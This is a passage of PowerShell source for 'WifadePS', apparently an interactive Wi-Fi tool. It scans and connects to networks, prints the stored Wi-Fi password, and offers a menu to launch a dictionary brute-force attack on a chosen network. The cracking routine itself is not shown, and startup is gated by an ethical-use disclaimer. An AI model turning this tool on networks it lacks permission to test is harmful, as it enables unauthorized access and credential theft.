# ApplicationController Class for WifadePS
# Main application controller that orchestrates the interactive CLI interface

class ApplicationController {
    [bool]$IsInitialized
    [hashtable]$Configuration
    [object]$UIManager
    [object]$SettingsManager
    [object]$NetworkManager
    [object]$PasswordManager
    [object]$ConfigurationManager
    [bool]$IsRunning
    [string]$CurrentMenu
    [hashtable]$AppConfig
    
    # Constructor
    ApplicationController() {
        $this.InitializeProperties()
    }
    
    # Constructor with configuration
    ApplicationController([hashtable]$config) {
        $this.InitializeProperties()
        $this.ApplyConfiguration($config)
    }
    
    # Initialize all properties
    [void] InitializeProperties() {
        # Initialize base class properties
        $this.IsInitialized = $false
        $this.Configuration = @{}
        
        # Initialize ApplicationController properties
        $this.IsRunning = $false
        $this.CurrentMenu = "Main"
        $this.AppConfig = @{}
    }
    
    # Initialize the ApplicationController
    [void] Initialize([hashtable]$config) {
        try {
            Write-Verbose "Starting ApplicationController initialization..."
            
            # Apply configuration
            Write-Verbose "Applying configuration..."
            if ($config.Count -gt 0) {
                $this.Configuration = $config
                $this.ApplyConfiguration($config)
            }
            Write-Verbose "Configuration applied successfully"
            
            # Initialize SettingsManager first
            Write-Verbose "Initializing SettingsManager..."
            try {
                $this.SettingsManager = New-Object SettingsManager
                $this.SettingsManager.Initialize(@{})
                Write-Verbose "SettingsManager initialized successfully"
            }
            catch {
                Write-Verbose "SettingsManager failed: $($_.Exception.Message)"
                Write-Warning "Could not initialize SettingsManager: $($_.Exception.Message)"
            }
            
            # Initialize UIManager with settings
            Write-Verbose "Preparing UIManager configuration..."
            $verboseMode = $false
            $colorScheme = @{}
            
            if ($null -ne $this.SettingsManager) {
                Write-Verbose "Getting settings from SettingsManager..."
                try {
                    $verboseMode = $this.SettingsManager.IsVerboseMode()
                    $colorScheme = $this.SettingsManager.GetColorScheme()
                    Write-Verbose "Settings retrieved successfully"
                }
                catch {
                    Write-Verbose "Failed to get settings: $($_.Exception.Message)"
                    Write-Warning "Could not get settings: $($_.Exception.Message)"
                }
            }
            
            Write-Verbose "Creating UIManager..."
            $uiConfig = @{
                VerboseMode = $verboseMode
                ColorScheme = $colorScheme
            }
            try {
                $this.UIManager = New-Object UIManager -ArgumentList $uiConfig
                Write-Verbose "UIManager object created"
                $this.UIManager.Initialize($uiConfig)
                Write-Verbose "UIManager initialized successfully"
            }
            catch {
                Write-Verbose "UIManager failed: $($_.Exception.Message)"
                Write-Verbose "Full error: $($_.Exception)"
                Write-Warning "Could not initialize UIManager: $($_.Exception.Message)"
            }
            
            $this.IsInitialized = $true
            Write-Verbose "ApplicationController initialization completed successfully"
        }
        catch {
            Write-Verbose "FATAL ERROR in Initialize: $($_.Exception.Message)"
            Write-Verbose "FATAL ERROR details: $($_.Exception)"
            throw "Failed to initialize ApplicationController: $($_.Exception.Message)"
        }
    }
    
    # Apply configuration settings
    [void] ApplyConfiguration([hashtable]$config) {
        $this.AppConfig = $config.Clone()
    }
    
    # Start the interactive application
    [void] Start() {
        try {
            $this.IsRunning = $true
            
            # Check if managers are initialized
            if ($null -eq $this.UIManager) {
                Write-Error "UIManager not initialized"
                return
            }
            
            if ($null -eq $this.SettingsManager) {
                Write-Error "SettingsManager not initialized"
                return
            }
            
            # Check ethical disclaimer
            $disclaimerAccepted = $this.SettingsManager.IsEthicalDisclaimerAccepted()
            if ($disclaimerAccepted -eq $false) {
                $userAccepted = $this.ShowEthicalDisclaimer()
                if ($userAccepted -eq $false) {
                    $this.UIManager.ShowError("Ethical acknowledgment required. Exiting...")
                    return
                }
            }
            
            # Main application loop
            while ($this.IsRunning) {
                try {
                    $this.HandleMainMenu()
                }
                catch [System.Management.Automation.PipelineStoppedException] {
                    # User pressed Ctrl+C
                    $this.UIManager.ShowWarning("Operation cancelled by user")
                    break
                }
                catch {
                    $this.UIManager.ShowError("An error occurred: $($_.Exception.Message)")
                    if ($this.SettingsManager.IsVerboseMode()) {
                        $this.UIManager.ShowVerbose("Stack trace: $($_.ScriptStackTrace)")
                    }
                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                }
            }
            
            $this.UIManager.ShowInfo("Thank you for using WifadePS!")
        }
        catch {
            Write-Error "Fatal error in application: $($_.Exception.Message)"
        }
    }
    
    # Show ethical disclaimer and get user acceptance
    [bool] ShowEthicalDisclaimer() {
        $this.UIManager.ClearScreen()
        $this.UIManager.ShowBanner()
        
        $warningText = @"
╔══════════════════════════════════════════════════════════════════════════════╗
║                            ETHICAL USAGE WARNING                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  This tool is designed for EDUCATIONAL and ETHICAL SECURITY TESTING only.   ║
║                                                                              ║
║  LEGAL REQUIREMENTS:                                                         ║
║  • You must own the networks you are testing, OR                            ║
║  • You must have explicit written permission from the network owner         ║
║                                                                              ║
║  PROHIBITED USES:                                                            ║
║  • Testing networks without permission                                       ║
║  • Accessing networks for malicious purposes                                 ║
║  • Any activity that violates local, state, or federal laws                 ║
║                                                                              ║
║  DISCLAIMER:                                                                 ║
║  • Users are solely responsible for compliance with applicable laws          ║
║  • The developers assume no liability for misuse of this tool               ║
║  • Unauthorized network access may result in criminal prosecution           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"@
        
        Write-Host $warningText -ForegroundColor Yellow
        Write-Host ""
        
        $accepted = $this.UIManager.GetConfirmation("Do you acknowledge that you will use this tool ethically and legally?", $false)
        
        if ($accepted) {
            $this.SettingsManager.AcceptEthicalDisclaimer()
            $this.UIManager.ShowSuccess("Thank you for your commitment to ethical security testing.")
            $this.UIManager.WaitForKeyPress("Press any key to continue...")
            return $true
        }
        
        return $false
    }
    
    # Handle main menu interactions
    [void] HandleMainMenu() {
        $choice = $this.UIManager.ShowMainMenu()
        
        switch ($choice.ToLower()) {
            "1" { $this.HandleScanNetworks() }
            "2" { $this.HandleAttackMode() }
            "3" { $this.HandleSettings() }
            "4" { $this.HandleHelp() }
            "q" { 
                $this.IsRunning = $false
                return
            }
            default {
                $this.UIManager.ShowWarning("Invalid option. Please try again.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
            }
        }
    }
    
    # Handle network scanning with Wi-Fi manager capabilities
    [void] HandleScanNetworks() {
        do {
            $this.UIManager.ClearScreen()
            $this.UIManager.ShowBanner()
            
            Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
            Write-Host "║                            WI-FI MANAGER                                     ║" -ForegroundColor Cyan
            Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
            Write-Host ""
            
            try {
                # Initialize NetworkManager if not already done
                if ($null -eq $this.NetworkManager) {
                    $this.UIManager.ShowInfo("Initializing Network Manager...")
                    $networkConfig = @{
                        AdapterScanInterval = 30
                        MonitoringEnabled   = $false
                    }
                    try {
                        $this.NetworkManager = New-Object NetworkManager -ArgumentList $networkConfig
                        $this.NetworkManager.Initialize($networkConfig)
                        $this.UIManager.ShowSuccess("Network Manager initialized")
                    }
                    catch {
                        $this.UIManager.ShowError("Failed to initialize Network Manager: $($_.Exception.Message)")
                        $this.UIManager.WaitForKeyPress("Press any key to continue...")
                        return
                    }
                }
                
                # Show current connection status
                $currentConnection = $this.NetworkManager.GetCurrentConnection()
                if ($currentConnection) {
                    $displayName = $currentConnection.SSID
                    if ($currentConnection.DisplayName) {
                        $displayName = $currentConnection.DisplayName
                    }
                    $this.UIManager.ShowSuccess("Currently connected to: $displayName (Signal: $($currentConnection.SignalStrength)%)")
                }
                else {
                    $this.UIManager.ShowInfo("Not currently connected to any Wi-Fi network")
                }
                Write-Host ""
                
                # Scan for networks
                $this.UIManager.ShowInfo("Scanning for Wi-Fi networks...")
                $networks = $this.NetworkManager.ScanNetworks()
                
                if ($networks.Count -eq 0) {
                    $this.UIManager.ShowWarning("No networks found")
                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                    return
                }
                
                $this.UIManager.ShowSuccess("Found $($networks.Count) networks")
                
                # Network management loop
                do {
                    $this.UIManager.ClearScreen()
                    $this.UIManager.ShowBanner()
                    
                    Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
                    Write-Host "║                            WI-FI MANAGER                                     ║" -ForegroundColor Cyan
                    Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
                    Write-Host ""
                    
                    # Show current connection status
                    $currentConnection = $this.NetworkManager.GetCurrentConnection()
                    if ($currentConnection) {
                        $displayName = $currentConnection.SSID
                        if ($currentConnection.DisplayName) {
                            $displayName = $currentConnection.DisplayName
                        }
                        $this.UIManager.ShowSuccess("Currently connected to: $displayName (Signal: $($currentConnection.SignalStrength)%)")
                    }
                    else {
                        $this.UIManager.ShowInfo("Not currently connected to any Wi-Fi network")
                    }
                    Write-Host ""
                    
                    $this.UIManager.ShowSuccess("Found $($networks.Count) networks")
                    
                    # Display networks
                    $this.UIManager.ShowNetworkList($networks)
                    
                    Write-Host ""
                    Write-Host "Wi-Fi Manager Options:" -ForegroundColor $this.UIManager.ColorScheme.Primary
                    Write-Host "  [1-$($networks.Count)] Connect to network" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host "  [r] Rescan networks" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host "  [w] Restart Wi-Fi adapter" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host "  [d] Disconnect from current network" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host "  [s] Show current connection status" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host "  [b] Back to main menu" -ForegroundColor $this.UIManager.ColorScheme.Secondary
                    Write-Host ""
                    
                    $choice = $this.UIManager.GetUserInput("Select an option", "^(\d+|[rRwWdDsSbB])$", "Please enter a valid option")
                    
                    switch ($choice.ToLower()) {
                        "r" {
                            $this.UIManager.ShowInfo("Rescanning networks...")
                            $networks = $this.NetworkManager.ScanNetworks($true)
                            $this.UIManager.ShowSuccess("Found $($networks.Count) networks after rescan")
                            continue
                        }
                        "w" {
                            $this.HandleRestartWiFiAdapter()
                            $this.UIManager.ShowInfo("Rescanning networks after Wi-Fi restart...")
                            $networks = $this.NetworkManager.ScanNetworks($true)
                            $this.UIManager.ShowSuccess("Found $($networks.Count) networks after Wi-Fi restart")
                            continue
                        }
                        "d" {
                            $this.HandleDisconnectNetwork()
                            continue
                        }
                        "s" {
                            $this.HandleShowConnectionStatus()
                            continue
                        }
                        "b" {
                            return
                        }
                        default {
                            # Check if it's a network number
                            if ($choice -match "^\d+$") {
                                $networkIndex = [int]$choice - 1
                                if ($networkIndex -ge 0 -and $networkIndex -lt $networks.Count) {
                                    $selectedNetwork = $networks[$networkIndex]
                                    $this.HandleConnectToNetwork($selectedNetwork)
                                    continue
                                }
                                else {
                                    $this.UIManager.ShowError("Invalid network number. Please select 1-$($networks.Count)")
                                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                                    continue
                                }
                            }
                        }
                    }
                } while ($true)
                
            }
            catch {
                $this.UIManager.ShowError("Failed to scan networks: $($_.Exception.Message)")
                if ($this.SettingsManager.IsVerboseMode()) {
                    $this.UIManager.ShowVerbose("Error details: $($_.Exception)")
                }
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
        } while ($true)
    }
    
    # Handle connecting to a specific network
    [void] HandleConnectToNetwork([NetworkProfile]$network) {
        try {
            $this.UIManager.ClearScreen()
            $this.UIManager.ShowBanner()
            
            Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
            Write-Host "║                           CONNECT TO NETWORK                                 ║" -ForegroundColor Cyan
            Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
            Write-Host ""
            
            # Show network details
            $this.UIManager.ShowInfo("Network Details:")
            Write-Host "  SSID: $($network.SSID)" -ForegroundColor White
            Write-Host "  Encryption: $($network.EncryptionType)" -ForegroundColor White
            Write-Host "  Signal Strength: $($network.SignalStrength)%" -ForegroundColor White
            Write-Host "  Authentication: $($network.AuthenticationMethod)" -ForegroundColor White
            Write-Host ""
            
            # Check if network is open (no password required)
            if ($network.EncryptionType -eq "Open" -or $network.AuthenticationMethod -eq "Open") {
                $confirmed = $this.UIManager.GetConfirmation("This is an open network. Connect without password?", $true)
                if ($confirmed) {
                    $this.AttemptNetworkConnection($network.SSID, "")
                }
                return
            }
            
            # Get password for secured networks
            $this.UIManager.ShowInfo("This network requires a password.")
            $password = $this.UIManager.GetUserInput("Enter password for '$($network.SSID)'", "", "")
            
            if ([string]::IsNullOrWhiteSpace($password)) {
                $this.UIManager.ShowWarning("No password entered. Connection cancelled.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Validate password before attempting connection
            $passwordValidation = $this.NetworkManager.ValidatePassword($password, $network)
            if (-not $passwordValidation.IsValid) {
                $this.UIManager.ShowError("Invalid password: $($passwordValidation.ErrorMessage)")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Attempt connection
            $this.AttemptNetworkConnection($network.SSID, $password)
            
        }
        catch {
            $this.UIManager.ShowError("Failed to connect to network: $($_.Exception.Message)")
            $this.UIManager.WaitForKeyPress("Press any key to continue...")
        }
    }
    
    # Attempt to connect to a network
    [void] AttemptNetworkConnection([string]$ssid, [string]$password) {
        try {
            # Check if already connected to this network
            $currentConnection = $this.NetworkManager.GetCurrentConnection()
            if ($currentConnection -and $currentConnection.SSID -eq $ssid) {
                $this.UIManager.ShowSuccess("Already connected to '$ssid'!")
                Write-Host ""
                $this.UIManager.ShowInfo("Connection Details:")
                Write-Host "  SSID: $($currentConnection.SSID)" -ForegroundColor White
                Write-Host "  Signal: $($currentConnection.SignalStrength)%" -ForegroundColor White
                Write-Host "  Encryption: $($currentConnection.EncryptionType)" -ForegroundColor White
                if ($currentConnection.Channel -gt 0) {
                    Write-Host "  Channel: $($currentConnection.Channel)" -ForegroundColor White
                }
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $this.UIManager.ShowInfo("Attempting to connect to '$ssid'...")
            
            # Use NetworkManager's connection method with shorter timeout (8 seconds instead of 15)
            $connectionAttempt = $this.NetworkManager.AttemptConnection($ssid, $password, 8)
            
            if ($connectionAttempt.Success) {
                $this.UIManager.ShowSuccess("Successfully connected to '$ssid'!")
                
                # Show connection details
                $currentConnection = $this.NetworkManager.GetCurrentConnection()
                if ($currentConnection) {
                    Write-Host ""
                    $this.UIManager.ShowInfo("Connection Details:")
                    Write-Host "  SSID: $($currentConnection.SSID)" -ForegroundColor White
                    Write-Host "  Signal: $($currentConnection.SignalStrength)%" -ForegroundColor White
                    Write-Host "  Encryption: $($currentConnection.EncryptionType)" -ForegroundColor White
                    if ($currentConnection.Channel -gt 0) {
                        Write-Host "  Channel: $($currentConnection.Channel)" -ForegroundColor White
                    }
                    
                    # Try to get IP information
                    try {
                        $ipConfig = Get-NetIPConfiguration -InterfaceAlias "Wi-Fi*" -ErrorAction SilentlyContinue | Where-Object { $_.IPv4Address -and $_.NetProfile.IPv4Connectivity -eq "Internet" } | Select-Object -First 1
                        if ($ipConfig -and $ipConfig.IPv4Address) {
                            Write-Host "  Private IP: $($ipConfig.IPv4Address.IPAddress)" -ForegroundColor White
                        }
                    }
                    catch {
                        # Ignore IP retrieval errors
                    }
                }
            }
            else {
                # Provide specific error messages based on the failure type
                if ($connectionAttempt.ErrorMessage -match "must be between 8 and 63 characters|must be at least 8 characters|WEP password must be") {
                    $this.UIManager.ShowError("Invalid password format: $($connectionAttempt.ErrorMessage)")
                }
                elseif ($connectionAttempt.ErrorMessage -match "authentication|password|credential") {
                    $this.UIManager.ShowError("Failed to connect to '$ssid' - Incorrect password")
                    $this.UIManager.ShowWarning("Please verify the password and try again.")
                }
                elseif ($connectionAttempt.ErrorMessage -match "timeout") {
                    $this.UIManager.ShowError("Failed to connect to '$ssid' - Connection timeout")
                    $this.UIManager.ShowWarning("The network may be out of range or experiencing issues.")
                }
                else {
                    $this.UIManager.ShowError("Failed to connect to '$ssid'")
                    if ($connectionAttempt.ErrorMessage) {
                        $this.UIManager.ShowError("Error: $($connectionAttempt.ErrorMessage)")
                    }
                }
            }
            
        }
        catch {
            $this.UIManager.ShowError("Connection attempt failed: $($_.Exception.Message)")
            if ($this.SettingsManager.IsVerboseMode()) {
                $this.UIManager.ShowDebug("Error details: $($_.Exception)")
            }
        }
        
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Handle disconnecting from current network
    [void] HandleDisconnectNetwork() {
        try {
            $currentConnection = $this.NetworkManager.GetCurrentConnection()
            
            if (-not $currentConnection) {
                $this.UIManager.ShowInfo("Not currently connected to any network.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $displayName = $currentConnection.SSID
            if ($currentConnection.DisplayName) {
                $displayName = $currentConnection.DisplayName
            }
            $confirmed = $this.UIManager.GetConfirmation("Disconnect from '$displayName'?", $false)
            if ($confirmed) {
                $this.UIManager.ShowInfo("Disconnecting from '$($currentConnection.SSID)'...")
                
                $success = $this.NetworkManager.DisconnectFromNetwork()
                if ($success) {
                    $this.UIManager.ShowSuccess("Successfully disconnected from network")
                }
                else {
                    $this.UIManager.ShowError("Failed to disconnect from network")
                }
            }
        }
        catch {
            $this.UIManager.ShowError("Failed to disconnect: $($_.Exception.Message)")
        }
        
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    
    # Handle Wi-Fi adapter restart
    [void] HandleRestartWiFiAdapter() {
        try {
            $this.UIManager.ShowInfo("Restarting Wi-Fi adapter...")
            $this.UIManager.ShowWarning("This will temporarily disconnect you from all networks.")
            
            # Check if running as administrator
            $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
            if (-not $isAdmin) {
                $this.UIManager.ShowWarning("Note: Running without administrator privileges. Using alternative restart method.")
            }
            
            $confirmed = $this.UIManager.GetConfirmation("Continue with Wi-Fi adapter restart?", $false)
            if (-not $confirmed) {
                $this.UIManager.ShowInfo("Wi-Fi restart cancelled.")
                return
            }
            
            # Get Wi-Fi adapter name
            $wifiAdapter = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "Wi-Fi|Wireless|802.11" -and $_.Status -eq "Up" } | Select-Object -First 1
            
            if (-not $wifiAdapter) {
                $this.UIManager.ShowError("No active Wi-Fi adapter found.")
                return
            }
            
            $adapterName = $wifiAdapter.Name
            $this.UIManager.ShowInfo("Found Wi-Fi adapter: $adapterName")
            
            # Try to disable/enable the adapter (requires admin privileges)
            try {
                $this.UIManager.ShowInfo("Disabling Wi-Fi adapter...")
                Disable-NetAdapter -Name $adapterName -Confirm:$false -ErrorAction Stop
                Start-Sleep -Seconds 3
                
                $this.UIManager.ShowInfo("Enabling Wi-Fi adapter...")
                Enable-NetAdapter -Name $adapterName -Confirm:$false -ErrorAction Stop
                Start-Sleep -Seconds 5
            }
            catch {
                # If admin privileges not available, try alternative method
                $this.UIManager.ShowWarning("Admin privileges required for adapter restart. Trying alternative method...")
                
                # Alternative: Use netsh to reset the adapter
                try {
                    $this.UIManager.ShowInfo("Resetting Wi-Fi adapter using netsh...")
                    & netsh interface set interface name="$adapterName" admin=disabled 2>&1 | Out-Null
                    Start-Sleep -Seconds 3
                    & netsh interface set interface name="$adapterName" admin=enabled 2>&1 | Out-Null
                    Start-Sleep -Seconds 5
                }
                catch {
                    # Final fallback: Just flush DNS and reset network stack
                    $this.UIManager.ShowInfo("Using network stack reset as fallback...")
                    & ipconfig /flushdns 2>&1 | Out-Null
                    & netsh winsock reset 2>&1 | Out-Null
                    & netsh int ip reset 2>&1 | Out-Null
                    Start-Sleep -Seconds 3
                }
            }
            
            # Wait for adapter to be ready
            $this.UIManager.ShowInfo("Waiting for Wi-Fi adapter to initialize...")
            $timeout = 15
            $elapsed = 0
            
            do {
                Start-Sleep -Seconds 1
                $elapsed++
                $adapterStatus = Get-NetAdapter -Name $adapterName -ErrorAction SilentlyContinue
                if ($adapterStatus -and $adapterStatus.Status -eq "Up") {
                    break
                }
            } while ($elapsed -lt $timeout)
            
            if ($elapsed -ge $timeout) {
                $this.UIManager.ShowWarning("Wi-Fi adapter restart completed but may still be initializing.")
            }
            else {
                $this.UIManager.ShowSuccess("Wi-Fi adapter restarted successfully!")
            }
            
        }
        catch {
            $this.UIManager.ShowError("Failed to restart Wi-Fi adapter: $($_.Exception.Message)")
            if ($this.SettingsManager.IsVerboseMode()) {
                $this.UIManager.ShowDebug("Error details: $($_.Exception)")
            }
        }
    }

    # Handle showing current connection status
    [void] HandleShowConnectionStatus() {
        try {
            $this.UIManager.ClearScreen()
            $this.UIManager.ShowBanner()
            
            Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
            Write-Host "║                         CONNECTION STATUS                                    ║" -ForegroundColor Cyan
            Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
            Write-Host ""
            
            $currentConnection = $this.NetworkManager.GetCurrentConnection()
            
            if ($currentConnection) {
                $this.UIManager.ShowSuccess("Connected to Wi-Fi Network")
                Write-Host ""
                Write-Host "Network Information:" -ForegroundColor $this.UIManager.ColorScheme.Primary
                if ($currentConnection.DisplayName -and $currentConnection.DisplayName -ne $currentConnection.SSID) {
                    Write-Host "  Network Name: $($currentConnection.DisplayName)" -ForegroundColor White
                }
                Write-Host "  SSID: $($currentConnection.SSID)" -ForegroundColor White
                Write-Host "  Signal Strength: $($currentConnection.SignalStrength)%" -ForegroundColor White
                Write-Host "  Encryption: $($currentConnection.EncryptionType)" -ForegroundColor White
                Write-Host "  Authentication: $($currentConnection.AuthenticationMethod)" -ForegroundColor White
                Write-Host "  Channel: $($currentConnection.Channel)" -ForegroundColor White
                Write-Host "  BSSID: $($currentConnection.BSSID)" -ForegroundColor White
                Write-Host "  Network Type: $($currentConnection.NetworkType)" -ForegroundColor White
                Write-Host "  Last Seen: $($currentConnection.LastSeen.ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor White
                
                # Get IP configuration information
                Write-Host ""
                Write-Host "IP Configuration:" -ForegroundColor $this.UIManager.ColorScheme.Primary
                try {
                    # Get Wi-Fi adapter IP configuration
                    $ipConfig = Get-NetIPConfiguration -InterfaceAlias "Wi-Fi*" -ErrorAction SilentlyContinue | Where-Object { $_.NetProfile.Name -eq $currentConnection.SSID } | Select-Object -First 1
                    
                    if ($ipConfig) {
                        # Private IP Address
                        if ($ipConfig.IPv4Address) {
                            Write-Host "  Private IP: $($ipConfig.IPv4Address.IPAddress)" -ForegroundColor White
                            Write-Host "  Subnet Mask: $($ipConfig.IPv4Address.PrefixLength) bits" -ForegroundColor White
                        }
                        
                        # Default Gateway
                        if ($ipConfig.IPv4DefaultGateway) {
                            Write-Host "  Default Gateway: $($ipConfig.IPv4DefaultGateway.NextHop)" -ForegroundColor White
                        }
                        
                        # DNS Servers
                        if ($ipConfig.DNSServer) {
                            $dnsServers = $ipConfig.DNSServer | Where-Object { $_.AddressFamily -eq 2 } | Select-Object -ExpandProperty ServerAddresses
                            if ($dnsServers) {
                                Write-Host "  DNS Servers: $($dnsServers -join ', ')" -ForegroundColor White
                            }
                        }
                        
                        # Get Public IP Address
                        Write-Host "  Public IP: " -NoNewline -ForegroundColor White
                        try {
                            $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5 -ErrorAction Stop).Trim()
                            Write-Host "$publicIP" -ForegroundColor Green
                        }
                        catch {
                            Write-Host "[Unable to retrieve]" -ForegroundColor Gray
                        }
                        
                        # Network adapter status
                        $adapter = Get-NetAdapter -InterfaceAlias "Wi-Fi*" | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1
                        if ($adapter) {
                            Write-Host "  Link Speed: $($adapter.LinkSpeed)" -ForegroundColor White
                            Write-Host "  MAC Address: $($adapter.MacAddress)" -ForegroundColor White
                        }
                    }
                    else {
                        Write-Host "  [IP configuration not available]" -ForegroundColor Gray
                    }
                }
                catch {
                    Write-Host "  [Error retrieving IP information: $($_.Exception.Message)]" -ForegroundColor Red
                }
                
                # Try to get saved password using both SSID and DisplayName
                $savedPassword = $this.NetworkManager.GetSavedPassword($currentConnection.SSID)
                if ([string]::IsNullOrWhiteSpace($savedPassword) -and $currentConnection.DisplayName) {
                    $savedPassword = $this.NetworkManager.GetSavedPassword($currentConnection.DisplayName)
                }
                
                if (-not [string]::IsNullOrWhiteSpace($savedPassword)) {
                    Write-Host "  Saved Password: $savedPassword" -ForegroundColor White
                }
                else {
                    Write-Host "  Saved Password: [Not available or open network]" -ForegroundColor Gray
                }
            }
            else {
                $this.UIManager.ShowWarning("Not connected to any Wi-Fi network")
                Write-Host ""
                $this.UIManager.ShowInfo("Use the Wi-Fi Manager to scan and connect to available networks.")
            }
            
            # Show adapter information
            Write-Host ""
            Write-Host "Adapter Information:" -ForegroundColor $this.UIManager.ColorScheme.Primary
            $adapterSummary = $this.NetworkManager.GetAdapterSummary()
            Write-Host $adapterSummary -ForegroundColor White
            
        }
        catch {
            $this.UIManager.ShowError("Failed to get connection status: $($_.Exception.Message)")
        }
        
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }

    # Handle attack mode menu
    [void] HandleAttackMode() {
        do {
            $choice = $this.UIManager.ShowAttackModeMenu()
            
            switch ($choice.ToLower()) {
                "1" { $this.HandleDictionaryAttack() }
                "2" { $this.HandleCustomPasswordFile() }
                "b" { return }
                default {
                    $this.UIManager.ShowWarning("Invalid option. Please try again.")
                    $this.UIManager.WaitForKeyPress("Press any key to continue...")
                }
            }
        } while ($true)
    }
    
    # Handle dictionary attack
    [void] HandleDictionaryAttack() {
        $this.UIManager.ClearScreen()
        $this.UIManager.ShowBanner()
        
        Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host "║                         WI-FI BRUTE FORCE ATTACK                             ║" -ForegroundColor Cyan
        Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
        Write-Host ""
        
        try {
            # Initialize managers if needed
            $this.InitializeAttackManagers()
            
            # Get available networks
            $this.UIManager.ShowInfo("Scanning for available networks...")
            $networks = $this.NetworkManager.ScanNetworks()
            
            if ($networks.Count -eq 0) {
                $this.UIManager.ShowWarning("No networks found. Please ensure Wi-Fi is enabled and networks are available.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Initialize networkChoice variable
            $networkChoice = ""
            
            # Network selection loop with rescan and Wi-Fi restart options
            do {
                # Display networks and let user select
                $this.UIManager.ShowNetworkList($networks)
                
                # Display options in a consistent style
                Write-Host "Options:" -ForegroundColor Cyan
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[1-$($networks.Count)]" -ForegroundColor Yellow -NoNewline
                Write-Host " to select a network to attack" -ForegroundColor White
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[r]" -ForegroundColor Yellow -NoNewline
                Write-Host " to rescan for networks" -ForegroundColor White
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[w]" -ForegroundColor Yellow -NoNewline
                Write-Host " to restart Wi-Fi adapter" -ForegroundColor White
                Write-Host "  • Enter " -ForegroundColor White -NoNewline
                Write-Host "[b]" -ForegroundColor Yellow -NoNewline
                Write-Host " to go back to previous menu" -ForegroundColor White
                Write-Host ""
                
                $networkChoice = $this.UIManager.GetUserInput("Select option", "^(\d+|[rRwWbB])$", "Please enter a valid option")
                
                # Check if user wants to go back
                if ($networkChoice.ToLower() -eq "b") {
                    return
                }
                
                # Check if user wants to restart Wi-Fi adapter
                if ($networkChoice.ToLower() -eq "w") {
                    $this.HandleRestartWiFiAdapter()
                    $this.UIManager.ShowInfo("Rescanning networks after Wi-Fi restart...")
                    $networks = $this.NetworkManager.ScanNetworks($true)  # Force fresh scan after restart
                    
                    if ($networks.Count -eq 0) {
                        $this.UIManager.ShowWarning("No networks found after Wi-Fi restart.")
                        continue
                    }
                    
                    $this.UIManager.ShowSuccess("Found $($networks.Count) networks after Wi-Fi restart")
                    continue
                }
                
                # Check if user wants to rescan
                if ($networkChoice.ToLower() -eq "r") {
                    $this.UIManager.ShowInfo("Rescanning for networks...")
                    $networks = $this.NetworkManager.ScanNetworks($true)  # Force fresh scan
                    
                    if ($networks.Count -eq 0) {
                        $this.UIManager.ShowWarning("No networks found after rescan.")
                        continue
                    }
                    
                    $this.UIManager.ShowSuccess("Found $($networks.Count) networks after rescan")
                    continue
                }
                
                # Valid network number selected, break the loop
                break
                
            } while ($true)
            
            $networkIndex = [int]$networkChoice - 1
            
            if ($networkIndex -lt 0 -or $networkIndex -ge $networks.Count) {
                $this.UIManager.ShowError("Invalid network selection.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            $targetNetwork = $networks[$networkIndex]
            $this.UIManager.ShowInfo("Target network: $($targetNetwork.SSID)")
            
            # Confirm attack
            $confirmed = $this.UIManager.GetConfirmation("Start brute force attack on '$($targetNetwork.SSID)'?", $false)
            if (-not $confirmed) {
                $this.UIManager.ShowInfo("Attack cancelled.")
                $this.UIManager.WaitForKeyPress("Press any key to continue...")
                return
            }
            
            # Start dictionary attack
            $this.ExecuteDictionaryAttack($targetNetwork)
            
        }
        catch {
            $this.UIManager.ShowError("Brute force attack failed: $($_.Exception.Message)")
            if ($this.SettingsManager.IsVerboseMode()) {
                $this.UIManager.ShowDebug("Error details: $($_.Exception)")
            }
        }
        
        $this.UIManager.WaitForKeyPress("Press any key to continue...")
    }
    

    

    
    # Handle custom password file attack
    [void] HandleCustomPasswordFile() {
        $this.UIManager.ClearScreen()
